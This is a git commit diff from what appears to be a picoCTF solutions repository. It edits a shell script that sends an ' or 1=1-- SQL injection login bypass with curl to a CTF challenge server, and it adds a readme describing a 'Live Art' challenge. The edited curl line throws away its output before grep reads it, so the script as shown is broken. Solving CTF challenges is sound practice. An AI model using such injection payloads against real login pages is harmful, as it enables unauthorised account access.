b30ec41f0e5dcbbbfaf715e3b8ee119b4460458e
Ulli Weichert <ulli.weichert@cloudsupplies.de>
2022-03-16 09:45:16 +0100

    added live_art

--- web/SQLiLite/get_flag.sh
+++ web/SQLiLite/get_flag.sh
@@ -3,4 +3,4 @@
 echo "A flag again...? Okay I'll get it for you..."
 read -p "Port?: " port
 
-curl -X POST "http://saturn.picoctf.net:${port}/login.php" -d "username=' or 1=1--" -d "password=' or 1=1--" | grep -o "picoCTF{.*}"
+curl -X POST "http://saturn.picoctf.net:${port}/login.php" -d "username=' or 1=1--" -d "password=' or 1=1--" > /dev/null 2>&1| grep -o "picoCTF{.*}"
---
+++ web/live_art/readme.md
@@ -0,0 +1,6 @@
+# Live Art
+
+## Description
+There's nothing quite as fun as drawing for an audience. So sign up for LiveArt today and show the world what you can do.
+Site: [Live Art](http://saturn.picoctf.net:50735/)
+Bundle: [here](https://artifacts.picoctf.net/c/342/bundle.tar.gz)
